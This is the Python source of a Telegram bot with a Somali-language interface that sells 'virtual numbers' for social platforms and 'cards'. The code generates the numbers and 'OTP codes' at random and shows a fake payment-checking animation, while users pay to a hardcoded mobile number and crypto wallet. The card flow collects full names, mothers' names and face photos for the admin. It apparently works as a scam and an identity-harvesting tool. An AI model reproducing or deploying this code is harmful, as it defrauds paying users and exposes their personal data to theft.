import os
import asyncio
import random
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.types import *
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.client.default import DefaultBotProperties

# ================= CONFIG =================
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 7983838654

LOCAL_NUMBER = "+252907868526"
BNB_ADDRESS = "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"
USDT_ADDRESS = "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher(storage=MemoryStorage())
logging.basicConfig(level=logging.INFO)

# ================= STATE =================
class VirtualState(StatesGroup):
    waiting_screenshot = State()

class CardState(StatesGroup):
    card_type = State()
    fullname = State()
    mother = State()
    face = State()
    payment_method = State()
    screenshot = State()

class AdminRegisterState(StatesGroup):
    waiting_otp = State()

# ================= DATA =================
users = {}
pending_admin_register = {}

# ================= HELPERS =================
def random_number():
    return "+25263" + "".join(str(random.randint(0,9)) for _ in range(7))

def generate_otp():
    return "".join(random.choices("0123456789", k=6))

async def live_animation(message, text="Loading", seconds=5):
    for i in range(seconds):
        dots = "." * (i % 4)
        await asyncio.sleep(1)
        await message.edit_text(f"{text}{dots}")

# ================= START =================
@dp.message(Command("start"))
async def start(msg: Message):
    kb = ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="New Order")]], resize_keyboard=True)
    await msg.answer("Ku soo dhawoow Service Bot 🤖", reply_markup=kb)

# ================= NEW ORDER =================
@dp.message(F.text == "New Order")
async def new_order(msg: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="VIRTUAL", callback_data="virtual_start")],
        [InlineKeyboardButton(text="CARD", callback_data="card_start")]
    ])
    await msg.answer("Dooro adeeg:", reply_markup=kb)

# ================= VIRTUAL SYSTEM =================
@dp.callback_query(F.data == "virtual_start")
async def virtual_platform(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=p, callback_data=f"v_platform_{p}")] for p in ["WHATSAPP","INSTAGRAM","TELEGRAM","GOOGLE","TIKTOK","FACEBOOK"]
    ])
    await call.message.edit_text("Dooro Platform:", reply_markup=kb)

@dp.callback_query(F.data.startswith("v_platform_"))
async def virtual_platform_selected(call: CallbackQuery):
    platform = call.data.split("_")[2]
    number = random_number()
    users[call.from_user.id] = {"type":"virtual","platform":platform,"number":number,"price":"$0.8"}
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LOCAL", callback_data="v_payment_local")],
        [InlineKeyboardButton(text="CRYPTO", callback_data="v_payment_crypto")]
    ])
    await call.message.edit_text(f"Number: {number}\nQiimaha: $0.8\nDooro Payment:", reply_markup=kb)

# ===== VIRTUAL LOCAL =====
@dp.callback_query(F.data == "v_payment_local")
async def virtual_local(call: CallbackQuery):
    uid = call.from_user.id
    if uid not in users:
        await call.message.answer("❌ Dalabka lama helin.")
        return
    number = users[uid]["number"]
    kb = InlineKeyboardMarkup([[InlineKeyboardButton(text="CONFIRM", callback_data=f"v_confirm_payment_{uid}")]])
    await call.message.edit_text(f"Fadlan lacagta ku dir:\n{LOCAL_NUMBER}\nLambarkaaga: {number}", reply_markup=kb)

@dp.callback_query(F.data.startswith("v_confirm_payment_"))
async def virtual_confirm_payment(call: CallbackQuery, state: FSMContext):
    msg = await call.message.edit_text("Checking...")
    await live_animation(msg, "Checking", 5)
    await call.message.answer("Fadlan soo dir Screenshot-ka lacag bixinta (PAYMENT)")
    await state.set_state(VirtualState.waiting_screenshot)

# ===== VIRTUAL CRYPTO =====
@dp.callback_query(F.data == "v_payment_crypto")
async def virtual_crypto(call: CallbackQuery):
    kb = InlineKeyboardMarkup([[InlineKeyboardButton(text="CONFIRM", callback_data="v_confirm_crypto")]])
    await call.message.edit_text(f"USDT: <code>{USDT_ADDRESS}</code>\nBNB: <code>{BNB_ADDRESS}</code>", reply_markup=kb)

@dp.callback_query(F.data == "v_confirm_crypto")
async def virtual_confirm_crypto(call: CallbackQuery, state: FSMContext):
    msg = await call.message.edit_text("Checking...")
    await live_animation(msg, "Checking", 5)
    await call.message.answer("Fadlan soo dir Screenshot-ka Crypto payment.")
    await state.set_state(VirtualState.waiting_screenshot)

# ===== RECEIVE SCREENSHOT =====
@dp.message(VirtualState.waiting_screenshot, F.photo)
async def virtual_screenshot(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    data = users.get(uid)
    if not data:
        await msg.answer("❌ Khalad: User data lama helin.")
        await state.clear()
        return
    users[uid]["screenshot"] = msg.photo[-1].file_id
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data=f"admin_confirm_{uid}"),
         InlineKeyboardButton(text="REJECT", callback_data=f"admin_reject_{uid}"),
         InlineKeyboardButton(text="OTP", callback_data=f"admin_otp_{uid}")]
    ])
    caption = f"New Virtual Order\nUser: {uid}\nPlatform: {data['platform']}\nNumber: {data['number']}"
    await bot.send_photo(ADMIN_ID, msg.photo[-1].file_id, caption=caption, reply_markup=kb)
    await msg.answer("Waad mahadsantahay. Dalabkaaga waa la hubinayaa.")
    await state.clear()

# ===== ADMIN ACTIONS =====
@dp.callback_query(F.data.startswith("admin_confirm_"))
async def admin_confirm(call: CallbackQuery):
    uid = int(call.data.split("_")[2])
    await bot.send_message(uid, "✅ Payment Confirmed. Adeeggaaga waa la diyaariyey.")
    await call.message.edit_caption("✅ PAYMENT CONFIRMED")

@dp.callback_query(F.data.startswith("admin_reject_"))
async def admin_reject(call: CallbackQuery):
    uid = int(call.data.split("_")[2])
    await bot.send_message(uid, "❌ Payment Lama xaqiijin. Fadlan isku day mar kale.")
    await call.message.edit_caption("❌ PAYMENT REJECTED")
    users.pop(uid, None)

@dp.callback_query(F.data.startswith("admin_otp_"))
async def admin_send_otp(call: CallbackQuery):
    uid = int(call.data.split("_")[2])
    otp = generate_otp()
    users[uid]["otp"] = otp
    kb = InlineKeyboardMarkup([[InlineKeyboardButton(text="SHOW OTP", callback_data="show_otp_user")]])
    await bot.send_message(uid, f"Number: {users[uid]['number']}\nPlatform: {users[uid]['platform']}\nPAYMENT: PAID ✅", reply_markup=kb)
    await call.message.edit_caption("OTP sent to user (hidden from admin)")

@dp.callback_query(F.data == "show_otp_user")
async def show_otp_user(call: CallbackQuery):
    uid = call.from_user.id
    otp = users[uid].get("otp")
    msg = await call.message.edit_text("OTP Loading...")
    await live_animation(msg, "OTP", 5)
    await msg.edit_text(f"Your OTP Code: {otp}")

# ================= CARD SYSTEM =================
@dp.callback_query(F.data == "card_start")
async def card_start(call: CallbackQuery, state: FSMContext):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="NORMAL ($1)", callback_data="card_type_normal")],
        [InlineKeyboardButton(text="VIP ($2)", callback_data="card_type_vip")]
    ])
    await call.message.edit_text("Dooro Nooca Card:", reply_markup=kb)

@dp.callback_query(F.data.startswith("card_type_"))
async def card_type_selected(call: CallbackQuery, state: FSMContext):
    price, ctype = ("$1","NORMAL") if call.data=="card_type_normal" else ("$2","VIP")
    await state.update_data(price=price, card_type=ctype)
    await call.message.answer("Geli Magacaaga Saddex Magac:")
    await state.set_state(CardState.fullname)

# -------- FULL CARD FLOW (Local & Crypto like Virtual) --------
@dp.message(CardState.fullname)
async def card_fullname(msg: Message, state: FSMContext):
    parts = msg.text.strip().split()
    if len(parts)!=3 or not all(p.isalpha() for p in parts):
        await msg.answer("❌ Geli 3 magac sax ah")
        return
    await state.update_data(fullname=msg.text.strip())
    await msg.answer("Geli Magaca Hooyada:")
    await state.set_state(CardState.mother)

@dp.message(CardState.mother)
async def card_mother(msg: Message, state: FSMContext):
    if not msg.text.isalpha():
        await msg.answer("❌ Magaca Hooyada waa xarfo keliya")
        return
    await state.update_data(mother=msg.text.strip())
    await msg.answer("Soo dir Sawirkaaga (Face Only):")
    await state.set_state(CardState.face)

@dp.message(CardState.face)
async def card_face(msg: Message, state: FSMContext):
    if not msg.photo:
        await msg.answer("❌ Fadlan sawir face dir")
        return
    await state.update_data(face=msg.photo[-1].file_id)
    number = random_number()
    await state.update_data(number=number)
    data = await state.get_data()
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LOCAL", callback_data="card_pay_local")],
        [InlineKeyboardButton(text="CRYPTO", callback_data="card_pay_crypto")]
    ])
    await msg.answer(f"Number: {number}\nQiimaha: {data['price']}\nDooro Payment:", reply_markup=kb)
    await state.set_state(CardState.payment_method)

# ===== CARD PAYMENTS =====
@dp.callback_query(F.data.startswith("card_pay_"))
async def card_payment(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    if call.data=="card_pay_local":
        text = f"Lacagta ku dir:\n{LOCAL_NUMBER}\nQiimaha: {data['price']}"
    else:
        text = f"USDT: <code>{USDT_ADDRESS}</code>\nBNB: <code>{BNB_ADDRESS}</code>"
    kb = InlineKeyboardMarkup([[InlineKeyboardButton(text="CONFIRM", callback_data="card_confirm_payment")]])
    await call.message.edit_text(text, reply_markup=kb)

@dp.callback_query(F.data=="card_confirm_payment")
async def card_confirm_payment(call: CallbackQuery, state: FSMContext):
    await call.message.edit_text("Checking...")
    await live_animation(call.message, "Checking", 5)
    await call.message.answer("Fadlan soo dir Screenshot-ka payment")
    await state.set_state(CardState.screenshot)

@dp.message(CardState.screenshot, F.photo)
async def card_receive_screenshot(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    data = await state.get_data()
    users[uid] = data
    users[uid]["screenshot"] = msg.photo[-1].file_id
    kb = InlineKeyboardMarkup([[InlineKeyboardButton(text="CONFIRM", callback_data=f"admin_card_confirm_{uid}"),
                                InlineKeyboardButton(text="REJECT", callback_data=f"admin_card_reject_{uid}")]])
    caption = f"New CARD Order\nUser: {uid}\nType: {data['card_type']}\nFullname: {data['fullname']}\nMother: {data['mother']}\nNumber: {data['number']}\nPrice: {data['price']}"
    await bot.send_photo(ADMIN_ID, msg.photo[-1].file_id, caption=caption, reply_markup=kb)
    await bot.send_photo(ADMIN_ID, data["face"])
    await state.clear()

@dp.callback_query(F.data.startswith("admin_card_confirm_"))
async def admin_card_confirm(call: CallbackQuery):
    uid = int(call.data.split("_")[3])
    await bot.send_message(uid,"✅ Card Payment Confirmed")
    await call.message.edit_caption("✅ CARD PAYMENT CONFIRMED")

@dp.callback_query(F.data.startswith("admin_card_reject_"))
async def admin_card_reject(call: CallbackQuery):
    uid = int(call.data.split("_")[3])
    await bot.send_message(uid,"❌ Card Payment Rejected")
    await call.message.edit_caption("❌ CARD PAYMENT REJECTED")
    users.pop(uid, None)

# ================= MAIN =================
async def main():
    print("Bot is running...")
    await dp.start_polling(bot)

if __name__=="__main__":
    asyncio.run(main())
